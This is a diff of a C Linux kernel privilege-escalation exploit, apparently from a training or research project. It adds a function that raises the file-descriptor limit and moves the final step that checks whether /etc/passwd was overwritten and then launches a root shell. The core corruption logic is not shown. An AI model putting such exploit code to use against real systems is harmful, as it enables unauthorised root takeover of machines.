@@ -21,11 +21,41 @@
 #include <stdlib.h>
 #include <assert.h>
 #include <sched.h>
+#include <sys/resource.h>
 #include <sys/user.h>
 #include "drill.h"
 
 #define STR_EXPAND(arg) #arg
 #define STR(arg) STR_EXPAND(arg)
+
+int increase_fd_limit(void)
+{
+	struct rlimit rlim;
+
+	if (getrlimit(RLIMIT_NOFILE, &rlim) == -1) {
+		perror("[-] getrlimit");
+		return EXIT_FAILURE;
+	}
+
+	rlim.rlim_cur = rlim.rlim_max;
+	if (setrlimit(RLIMIT_NOFILE, &rlim) == -1) {
+		perror("[-] setrlimit");
+		return EXIT_FAILURE;
+	}
+
+	if (getrlimit(RLIMIT_NOFILE, &rlim) == -1) {
+		perror("[-] getrlimit");
+		return EXIT_FAILURE;
+	}
+
+	if (rlim.rlim_cur != rlim.rlim_max) {
+		printf("[-] failed to increase max file descriptor number\n");
+		return EXIT_FAILURE;
+	}
+
+	printf("[+] increased max file descriptor number to %ld\n", rlim.rlim_cur);
+	return EXIT_SUCCESS;
+}
 
 int do_cpu_pinning(int cpu_n)
 {
@@ -418,15 +448,6 @@ int main(void)
 	}
 	printf("[+] wrote to pipes\n");
 
-	if (check_passwd() == EXIT_SUCCESS) {
-		printf("[+] /etc/passwd is overwritten, now try to run the root shell\n");
-		result = EXIT_SUCCESS;
-		execv("/bin/sh", argv); /* This should not return */
-		perror("[-] execv");
-	}
-
-	printf("[-] exploit failed\n");
-
 end:
 	for (i = 0; i < PIPES_N; i++) {
 		if (pipe_fds[i][0] >= 0) {
@@ -451,6 +472,15 @@ end:
 		ret = close(act_fd);
 		if (ret != 0)
 			perror("[-] close act_fd");
+	}
+
+	if (check_passwd() == EXIT_SUCCESS) {
+		printf("[+] /etc/passwd is overwritten, now try to run the root shell\n");
+		result = EXIT_SUCCESS;
+		execv("/bin/sh", argv); /* This should not return */
+		perror("[-] execv");
+	} else {
+		printf("[-] exploit failed\n");
 	}
 
 	return result;
